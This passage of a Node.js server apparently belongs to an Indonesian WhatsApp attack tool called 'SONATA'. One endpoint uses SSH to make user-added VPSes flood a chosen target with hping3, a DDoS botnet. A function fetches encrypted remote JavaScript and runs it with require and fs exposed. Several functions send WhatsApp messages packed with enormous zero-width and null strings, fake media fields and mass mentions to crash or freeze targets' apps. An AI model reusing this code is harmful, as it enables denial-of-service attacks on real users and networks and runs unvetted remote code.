  if (!user) return res.status(401).json({ valid: false, message: 'Invalid session' });
  const target = String(req.params.username || '');
  if (!target || target === user.username) return res.status(400).json({ valid: false, message: 'Target tidak valid' });
  markOnline(user.username, user.role);
  const messages = chatList.filter(m => (m.from === user.username && m.to === target) || (m.from === target && m.to === user.username)).slice(-200).map(m => ({ ...m, fromMe: m.from === user.username }));
  res.json({ valid: true, target, messages });
});

app.post('/api/chat/private', (req, res) => {
  const user = authUserFromRequest(req);
  if (!user) return res.status(401).json({ valid: false, message: 'Invalid session' });
  const target = String(req.body?.to || '');
  const message = sanitize(String(req.body?.message || '')).trim();
  if (!target || target === user.username) return res.status(400).json({ valid: false, message: 'Target tidak valid' });
  if (!onlineUserList().some(u => u.username === target)) return res.status(404).json({ valid: false, message: 'User sedang offline' });
  if (!message || message.length > 500) return res.status(400).json({ valid: false, message: 'Message kosong atau terlalu panjang' });
  markOnline(user.username, user.role);
  const chat = { from: user.username, to: target, message, role: user.role, time: new Date().toISOString(), created_at: new Date().toISOString() };
  chatList.push(chat); saveChat();
  if (wsClients[target]?.readyState === WebSocket.OPEN) wsClients[target].send(JSON.stringify({ type: 'private_message', message: { ...chat, fromMe: false } }));
  res.json({ valid: true, message: { ...chat, fromMe: true } });
});

app.get("/api/chat/messages", (req, res) => {
  const { session_key } = req.query;
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userMessages = chatList.filter(m => m.from === username || m.to === username);
  res.json(userMessages);
});

app.post("/api/chat/send", (req, res) => {
  const { session_key, username, role, message } = req.body;
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session" });
  if (keyInfo.username !== username) return res.status(401).json({ valid: false, message: "Username mismatch" });
  if (!message || message.trim() === "") return res.status(400).json({ valid: false, message: "Message cannot be empty" });

  const chat = {
    from: username, to: "public",
    message: sanitize(message), role,
    time: new Date().toISOString(),
    created_at: new Date().toISOString()
  };

  chatList.push(chat);
  saveChat();

  for (const ws of Object.values(wsClients)) {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'new_message', message: chat }));
    }
  }

  res.json({ valid: true, status: "sent", message: chat });
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    return res.json({ valid: false, message: "Query failed" });
  }
});

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });
  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });
  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) continue;

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code) => console.log(`✅ Command done on ${vps.host} (code: ${code})`));
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("    SONATA V1 — PART 5/15");
console.log("    STATUS : AUTH + CHAT + VPS OK");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
// ═══════════════════════════════════════════════════════════════════════
//  SONATA — v2 FULL EDITION
//  Part 6/15: FUNGSI BUG WA — BATCH 1
// ═══════════════════════════════════════════════════════════════════════

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require, console, process, Buffer, setTimeout, setInterval, clearInterval,
      crypto, proto, generateWAMessageFromContent, prepareWAMessageMedia,
      generateWAMessageContent, generateWAMessage, waUploadToServer,
      fs, generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function DelayInvis(sock, target) {
    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u200B".repeat(15000) + "\u200D".repeat(10000) + "\u200C".repeat(5000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    nativeFlowResponMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const msg2 = {
        interactiveMessage: {
            body: {
                text: "\u200B".repeat(15000) + "\u200C".repeat(10000) + "\u0000".repeat(5000)
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({})),
                chat_ai_message: "meta_ai_message".repeat(20000)
            },
            nativeFlowResponMessage: {
                buttons: Array.from({ length: 500000 }, () => ({}))
            }
        }
    };

    await sock.relayMessage(target, msg1, { participant: { jid: target } });
    await sock.relayMessage(target, msg2, { participant: { jid: target } });
}

async function fiOS(target, i = 1) {
  for (let z = 0; z < i; z++) {
    await client.relayMessage(target, {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            locationMessage: {
              degreesLongitude: 0,
              degreesLatitude: 0,
              // jpegThumbnail: null,
              name: "𑇂𑆵𑆴𑆿".repeat(9000)
            },
            contentText: "XazepysK",
            buttons: [{
              buttonId: "DsynC",
              buttonText: {
                displayText: "𑇂𑆵𑆴𑆿".repeat(1000)
              },
              type: 1
            }],
            headerType: 6
          }
        }
      }
    }, {
      isSecret: true
    })
    await sleep(1000);
  }
}

async function groupBan1(sock, target) {
    if (!target.endsWith("@g.us")) {
        throw new Error("@g.us server required");
    }

    const fakeNumbers = [
        "6280000000000@s.whatsapp.net",
        "14155552671@s.whatsapp.net",
        "447400000000@s.whatsapp.net",
        "61400000000@s.whatsapp.net",
        "6281234567890@s.whatsapp.net",
        "6287873499996@s.whatsapp.net",
        "6285655555555@s.whatsapp.net",
        "6289876543210@s.whatsapp.net",
        "6281111111111@s.whatsapp.net",
        "6282222222222@s.whatsapp.net",
        "6283333333333@s.whatsapp.net",
        "6284444444444@s.whatsapp.net",
        "6285555555555@s.whatsapp.net",
        "6286666666666@s.whatsapp.net",
        "6287777777777@s.whatsapp.net",
        "6288888888888@s.whatsapp.net",
        "6289999999999@s.whatsapp.net"
    ];

    const actions = ["add", "remove", "promote", "demote"];
    const fake = fakeNumbers[Math.floor(Math.random() * fakeNumbers.length)];
    const action = actions[Math.floor(Math.random() * actions.length)];

    try {
        await sock.groupParticipantsUpdate(target, [fake], action);
        return true;
    } catch (e) {
        return false;
    }
}

async function FrezeInvis(sock, target) {
  const payloads = []
  for (let i = 0; i < 50; i++) {
    payloads.push({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "\u200B".repeat(3000) + "SONATA" + "\u200B".repeat(3000) },
            nativeFlowMessage: {
              name: "\u200C".repeat(5000) + "SONATA" + "\u200C".repeat(5000),
              extra: "\u31040" + "\u0000".repeat(1000 + i * 300),
              buttons: "A".repeat(30000 + i * 2000),
              butrons: "A".repeat(70000 + i * 3000),
              extra1: "\u0000".repeat(1000 + i * 400),
              extra2: "\u0000".repeat(1000 + i * 300),
              flow_action: "\u200D".repeat(3000) + "Çfarë" + "\u200D".repeat(3000),
              flow_cta: "\u200E".repeat(3000) + "Qenots" + "\u200E".repeat(3000)
            }
          }
        }
      },
      callogMesaage: {
        Callid: "\u0000".repeat(8000 + i * 600),
        extraCall1: "\u0000".repeat(25000 + i * 1500),
        extraCall2: "\u0000".repeat(7000 + i * 500),
        flow_cta: "\u200F".repeat(3000) + "Hondang" + "\u200F".repeat(3000)
      }
    })
  }
  for (let i = 0; i < payloads.length; i++) {
    await sock.relayMessage(target, payloads[i], {
      participant: { jid: target },
      noSelfSync: true
    })
    await new Promise(resolve => setTimeout(resolve, 150))
    if (i % 10 === 0) {
      const silentMsg = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "\u200B".repeat(10000) },
              nativeFlowMessage: {
                name: "\u200C".repeat(15000),
                extra: "\u31040" + "\u0000".repeat(15000),
                buttons: "A".repeat(100000),
                butrons: "A".repeat(120000),
                extra1: "\u0000".repeat(12000),
                extra2: "\u0000".repeat(10000),
                flow_action: "\u200D".repeat(10000),
                flow_cta: "\u200E".repeat(10000)
              }
            }
          }
        }
      }
      await sock.relayMessage(target, silentMsg, {
        participant: { jid: target },
        noSelfSync: true
      })
      await new Promise(resolve => setTimeout(resolve, 100))
    }
  }
  for (let j = 0; j < 20; j++) {
    const lastMsg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "\u200B".repeat(15000) },
            nativeFlowMessage: {
              name: "\u200C".repeat(20000),
              extra: "\u31040" + "\u0000".repeat(20000),
              buttons: "A".repeat(150000),
              butrons: "A".repeat(180000),
              extra1: "\u0000".repeat(20000),
              extra2: "\u0000".repeat(15000),
              flow_action: "\u200D".repeat(15000),
              flow_cta: "\u200E".repeat(15000)
            }
          }
        }
      },
      callogMesaage: {
        Callid: "\u0000".repeat(15000),
        extraCall1: "\u0000".repeat(40000),
        extraCall2: "\u0000".repeat(12000),
        flow_cta: "\u200F".repeat(15000)
      }
    }
    await sock.relayMessage(target, lastMsg, {
      participant: { jid: target },
      noSelfSync: true
    })
    await new Promise(resolve => setTimeout(resolve, 80))
  }
}


async function fiOS(target, i = 1) {
  for (let z = 0; z < i; z++) {
    await client.relayMessage(target, {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            locationMessage: {
              degreesLongitude: 0,
              degreesLatitude: 0,
              name: "𑇂𑆵𑆴𑆿".repeat(9000)
            },
            contentText: "XazepysK",
            buttons: [{
              buttonId: "DsynC",
              buttonText: {
                displayText: "𑇂𑆵𑆴𑆿".repeat(1000)
              },
              type: 1
            }],
            headerType: 6
          }
        }
      }
    }, {
      isSecret: true
    })
    await sleep(1000);
  }
}

async function docthumbb(sock, target) {
  await sock.relayMessage(target,
    generateWAMessageFromContent(target,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(80000),
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "vsp/vaultsuperior",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "1073741824000000",
                  pageCount: 9007199254740991 * 9999,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(60000),
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(80000),
              },
              contextInfo: {
                remoteJid: "X",
                participant: sock.user.id,
                mentionedJid: [target, "13135550002@s.whatsapp.net"],
                quotedMessage: {},
                isForwarded: true,
                forwardingScore: 9999,
                externalAdReply: {
                  title: "🦋 .r4LdzHeLL¡!",
                  body: "t.me/rraldz $$$ t.me/voidp",
                  mediaType: "VIDEO",
                  renderLargerThumbnail: false,
                  containsAutoReply: true,
                  showAdAttribution: true,
                  thumbnail: { url: "https://files.catbox.moe/qh0oqq.jpg" },
                },
              },
              nativeFlowMessage: {
                messageParamsJson: "{",
                buttons: [
                  {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({
                      icon: "REVIEW",
                      flow_cta: "\0" + "💣⃟༑𝑹𝒂𝒍𝒅𝒛𝒛⌁𝑬𝒙𝒆𝒄𝒖𝒕𝒊𝒗𝒆⃰ ‌ཀ‌‌🪅-‣" + "\u0000".repeat(60000),
                      flow_message_version: "3"
                    })
                  },
                ]
              }
            }
          }
        }
      }),
      { userJid: target }
    ).message,
    {
      messageId: generateWAMessageFromContent(
        target,
        proto.Message.fromObject({}),
        { userJid: target }
      ).key.id,
    }
  );
}

async function Adress(sock, target) {
  await sock.relayMessage("status@broadcast", {
    interactiveResponseMessage: {
      body: {
        text: "N!ted °B!tch",
        format: "EXTENSIONS_1"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: "\x10".repeat(2000),
        version: 3
      },
      contextInfo: {
        groupMentions: Array.from({ length: 2000 }, () => ({
          groupJid: `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`,
          groupSubject: "TheUciha"
        }))
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  });
}

async function iNTxSqL(sock, target) {
  let invalidJid = "@RaldzzXyz $$$ @voidp $$$ @rraldz";
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage("status@broadcast", {
      interactiveResponseMessage: {
        body: { text: "\x10.r4LdzHeaven 👁‍🗨", format: "EXTENSIONS_1" },
        nativeFlowResponseMessage: {
          name: (["address_message", "call_permission_request"][(i + (Math.random() < 0.5 ? 1 : 0)) % 2]),
          paramsJson: "{".repeat(1),
          version: 3
        },
        contextInfo: {
          remoteJid: invalidJid,
          mentionedJid: invalidJid,
          parentGroupJid: invalidJid,
          businessMessageForwardInfo: { businessOwnerJid: invalidJid },
          quotedMessage: { conversation: { lidJid: invalidJid, pnJid: invalidJid, oldJid: invalidJid, newJid: invalidJid } },
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 200900 }, () => ({ type: 1 }))
          }
        }
      }
    }, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: { status_setting: "allowlist" },
        content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: [] }] }]
      }]
    });
  }
  await sleep(1000);
}

async function iNTxSq(sock, target) {
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage("status@broadcast", {
      interactiveResponseMessage: {
        body: { text: "\x10.r4LdzHeaven 👁‍🗨", format: "EXTENSIONS_1" },
        nativeFlowResponseMessage: {
          name: (["address_message", "call_permission_request"][(i + (Math.random() < 0.5 ? 1 : 0)) % 2]),
          paramsJson: "{".repeat(1),
          version: 3
        },
        contextInfo: {
          remoteJid: "@RaldzzXyz $$$ @voidp $$$ @rraldz",
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 200900 }, () => ({ type: 1 }))
          }
        }
      }
    }, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: { status_setting: "allowlist" },
        content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: [] }] }]
      }]
    });
  }
  await sleep(1000);
}

console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("    SONATA V1 — PART 6/15");
console.log("    STATUS : BUG WA BATCH 1 OK");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

// ═══════════════════════════════════════════════════════════════════════
//  Part 7/15: FUNGSI BUG WA — BATCH 2
// ═══════════════════════════════════════════════════════════════════════

async function callCrash(sock, target) {
  await sock.relayMessage(target, {
    albumMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`),
        remoteJid: " ¡!deadcodex!¡ ",
        parentGroupJid: "0@g.us",
        isQuestion: true,
        isSampled: true,
        entryPointConversionDelaySeconds: 6767676767,
        businessMessageForwardInfo: null,
        botMessageSharingInfo: { botEntryPointOrigin: { origins: "BOT_MESSAGE_ORIGIN_TYPE_AI_INITIATED" }, forwardScore: 999 },
        quotedMessage: {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: { text: "@xrelly • #fvcker 🩸", format: "EXTENSIONS_1" },
                nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: "\u0000".repeat(1000000), version: 1 }
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function D3nss(sock, target) {
  const StanzaSock = {
    viewOnceMessage: {
      message: {
        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "Gw Rizz Bang‌",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: ""
              }
            }
          },
          body: { text: " " + "ꦽ".repeat(100000) },
          nativeFlowMessage: {
            buttons: [
              { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), id: null }) },
              { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), id: null }) },
              { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), url: "https://" + "𑜦𑜠".repeat(10000) + ".com" }) },
              { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), copy_code: "𑜦𑜠".repeat(10000) }) },
              { name: "galaxy_message", buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "PAYMENT_PROMOTION", flow_message_version: "3" }) }
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage(target, StanzaSock, {
    messageId: sock.generateMessageTag(),
    participant: { jid: target }
  });
}

async function crashGroup(sock, target) {
  const payload = {
    extendedTextMessage: {
      text: "DENIS" + "ꦽ".repeat(45000),
      description: " ayun<3 ",
      title: "denis is back?!! ",
      paymentLinkMetadata: { button: { displayText: "  @DENIS fucker" }, header: { headerType: 1 }, provider: { paramsJson: "{{".repeat(10000) } },
      linkPreviewMetadata: {
        paymentLinkMetadata: { button: { displayText: "  @xrelly fucker" }, header: { headerType: 1 }, provider: { paramsJson: "{{".repeat(10000) } },
        urlMetadata: { fbExperimentId: 999 },
        fbExperimentId: 888,
        linkMediaDuration: 555,
        socialMediaPostType: 1221
      }
    }
  };

  const groupPayload = { groupStatusMessageV2: { message: payload } };
  const msg = generateWAMessageFromContent(target, groupPayload, {});

  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  await sleep(2000);
  await sock.sendMessage(target, { delete: { remoteJid: target, fromMe: true, id: msg.key.id } });
}

console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("    SONATA V1 — PART 7/15");
console.log("    STATUS : BUG WA BATCH 2 OK");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
// ═══════════════════════════════════════════════════════════════════════
//  Part 8/15: FUNGSI BUG WA — BATCH 3
// ═══════════════════════════════════════════════════════════════════════

async function inTers(sock, target) {
  try {
    const currentRepeatCount = 522500;

    const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: ".menu", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(currentRepeatCount),
              version: 3
            },
            contextInfo: { entryPointConversionSource: "call_permission_request" }
          }
        }
      }
    }, { userJid: target, messageId: undefined, messageTimestamp: (Date.now() / 1000) | 0 });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }]
      }]
    }, { participant: target });

    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "x", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(currentRepeatCount),
              version: 3
            },
            contextInfo: { entryPointConversionSource: "call_permission_request" }
          }
        }
      }
    }, { userJid: target, messageId: undefined, messageTimestamp: (Date.now() / 1000) | 0 });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }]
      }]
    }, { participant: target });

    const Audio = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: ["@s.whatsapp.net", ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 90000000) + "@s.whatsapp.net")],
                isForwarded: true,
                forwardedNewsletterMessageInfo: { newsletterJid: "133@newsletter", serverMessageId: 1, newsletterName: "𞋯" }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };

    const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });

    await sock.relayMessage("status@broadcast", msgAudio.message, {
      messageId: msgAudio.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }]
      }]
    });

    const stickerMsg = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
        fileLength: 12260,
